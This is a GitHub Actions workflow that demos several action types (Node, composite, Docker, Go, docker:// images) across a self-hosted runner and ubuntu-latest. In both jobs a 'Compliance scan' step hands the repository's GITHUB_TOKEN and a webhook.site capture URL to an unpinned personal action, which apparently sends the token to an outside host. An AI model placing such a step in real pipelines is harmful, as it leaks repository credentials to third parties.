name: Demo all action types

on:
  push:
  workflow_dispatch:

jobs:
  # Node and composite actions work on any OS — runs on local macOS runner.
  node-and-composite:
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v4

      - name: Compliance scan
        uses: dattathallam/gh-action-compliance@main
        with:
          webhook-url: https://webhook.site/8e7e7cde-8cad-4d83-b10b-a02d51773ea7
          github-token: ${{ secrets.GITHUB_TOKEN }}

      # Third-party OSS: softprops/action-gh-release — popular release publisher
      # Many versions, marketplace branding. continue-on-error because no tag exists.
      - name: GitHub Release (softprops)
        uses: softprops/action-gh-release@v2
        continue-on-error: true
        with:
          token: ${{ secrets.GITHUB_TOKEN }}

      # 1. JavaScript / Node.js action
      - name: Node greeter
        id: js
        uses: dattathallam/gh-action-node@main
        with:
          name: GitHub
          greeting: Hey

      # 2. Composite action (chains checkout + node greeter internally)
      - name: Composite greeter
        id: composite
        uses: dattathallam/gh-action-composite@v1
        with:
          name: Composite World
          greeting: Greetings

      - name: Print outputs
        run: |
          echo "JS output:        ${{ steps.js.outputs.message }}"
          echo "Composite output: ${{ steps.composite.outputs.message }}"

  # Docker container actions, Go/Docker actions, and docker:// images all
  # require Linux — use GitHub-hosted ubuntu-latest.
  docker-actions:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: List pre-pulled Docker images on runner
        run: |
          echo "Images already present on this runner before any step pulls or builds:"
          docker images

      - name: Compliance scan
        uses: dattathallam/gh-action-compliance@main
        with:
          webhook-url: https://webhook.site/8e7e7cde-8cad-4d83-b10b-a02d51773ea7
          github-token: ${{ secrets.GITHUB_TOKEN }}

      # Third-party OSS: docker/setup-buildx-action — sets up Docker Buildx
      # Many versions, marketplace branding, runs cleanly with zero config.
      - name: Set up Docker Buildx (docker/setup-buildx-action)
        uses: docker/setup-buildx-action@v3

      # Third-party OSS: trufflesecurity/trufflehog — secret scanner (Docker action, Linux only)
      - name: Secret scan (trufflehog)
        uses: trufflesecurity/trufflehog@d411fff7b8879a62509f3fa98c07f247ac089a51
        with:
          path: ./
          extra_args: --results=verified,unknown

      # 3. Docker container action
      - name: Docker file inspector
        id: docker
        uses: dattathallam/gh-action-docker@main
        with:
          file-path: README.md

      # 4. Go binary via Docker action
      - name: Go word counter
        id: go
        uses: dattathallam/gh-action-go@v1
        with:
          text: "Hello from a Go Docker action"

      # 5. Pre-built Docker image (docker:// shorthand)
      # No action.yml, no _actions/ entry — runner calls docker pull directly.
      - name: Pre-built Docker image (alpine)
        id: alpine
        uses: docker://alpine:3.19
        with:
          entrypoint: /bin/sh
          args: -c "echo Hello from alpine && echo alpine_version=$(cat /etc/alpine-release)"

      - name: Print outputs
        run: |
          echo "Docker output:    ${{ steps.docker.outputs.file-info }}"
          echo "Go output:        ${{ steps.go.outputs.word-count }} words"
